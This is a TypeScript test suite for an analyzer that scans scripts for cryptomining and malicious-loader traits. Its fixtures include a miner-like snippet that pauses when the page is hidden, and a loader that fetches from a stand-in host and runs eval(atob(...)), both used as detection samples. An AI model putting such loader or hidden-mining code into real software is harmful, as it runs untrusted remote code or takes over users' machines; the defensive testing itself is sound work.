import { describe, expect, it } from "vitest";
import { analyzeScriptAst } from "./ast-analyzer.js";

function signalCodes(sourceText: string): string[] {
  return analyzeScriptAst(sourceText).signals.map((signal) => signal.code);
}

describe("analyzeScriptAst", () => {
  it("uses a parsed syntax tree to find mining-related capabilities and branches", () => {
    const analysis = analyzeScriptAst(`
      const worker = new Worker("./compute-worker.js");
      const socket = new WebSocket("wss://pool.invalid/socket");
      socket.send("mining.subscribe");
      const module = await WebAssembly.instantiate(moduleBytes);
      if (document.visibilityState === "hidden") worker.postMessage("pause");
      for (;;) {
        state = Math.imul(state ^ (state << 5), 2654435761)
          ^ (state >>> 7) ^ (state << 9);
      }
    `);

    expect(analysis.analyzer).toBe("typescript-ast");
    expect(analysis.parserVersion).toMatch(/^\d+\.\d+/);
    expect(analysis.parseStatus).toBe("complete");
    expect(analysis.nodeCount).toBeGreaterThan(20);
    expect(analysis.branchCount).toBe(1);
    expect(analysis.signals.map((signal) => signal.code)).toEqual([
      "ast.worker-construction",
      "ast.wasm-use",
      "ast.websocket",
      "ast.mining-protocol",
      "ast.hash-loop",
      "ast.execution-guard",
    ]);
  });

  it("does not treat comments or ordinary mining prose as executable features", () => {
    const analysis = analyzeScriptAst(`
      // new Worker("worker.js"); WebAssembly.instantiate(bytes);
      /* new WebSocket("wss://example.test"); "mining.subscribe" */
      const topic = "mining and stratum documentation";
      const minerLabel = "miner";
    `);

    expect(analysis.signals).toEqual([]);
  });

  it("recognizes a three-part obfuscated remote loader without retaining source", () => {
    const source = `
      const response = await fetch("https://payload.invalid/module");
      const encoded = await response.text();
      eval(atob(encoded));
    `;
    const analysis = analyzeScriptAst(source);

    expect(signalCodes(source)).toEqual([
      "ast.dynamic-code",
      "ast.encoded-payload",
      "ast.remote-load",
    ]);
    expect(JSON.stringify(analysis)).not.toContain("payload.invalid");
    expect(JSON.stringify(analysis)).not.toContain("eval(atob");
  });

  it("bounds parser input and records truncation without echoing the tail", () => {
    const source = `const safe = true;${"x".repeat(200)}secret-tail`;
    const analysis = analyzeScriptAst(source, { maxSourceChars: 32 });

    expect(analysis.truncated).toBe(true);
    expect(analysis.sourceLength).toBe(source.length);
    expect(analysis.analyzedLength).toBe(32);
    expect(JSON.stringify(analysis)).not.toContain("secret-tail");
  });

  it("fails open without throwing or echoing deeply nested parser input", () => {
    const source = `${"(".repeat(1_500)}secretIdentifier${")".repeat(1_500)}`;

    expect(() => analyzeScriptAst(source)).not.toThrow();
    const analysis = analyzeScriptAst(source);
    expect(analysis).toMatchObject({
      parseStatus: "failed",
      failureCode: "parser-resource-limit",
      nodeCount: 0,
      signals: [],
    });
    expect(JSON.stringify(analysis)).not.toContain("secretIdentifier");
  });

  it("does not recurse through adversarially long property-access paths", () => {
    const source = `${"root.".repeat(10_000)}leaf()`;

    expect(() => analyzeScriptAst(source)).not.toThrow();
    const analysis = analyzeScriptAst(source);
    expect(["complete", "failed"]).toContain(analysis.parseStatus);
    expect(JSON.stringify(analysis)).not.toContain(source);
  });
});
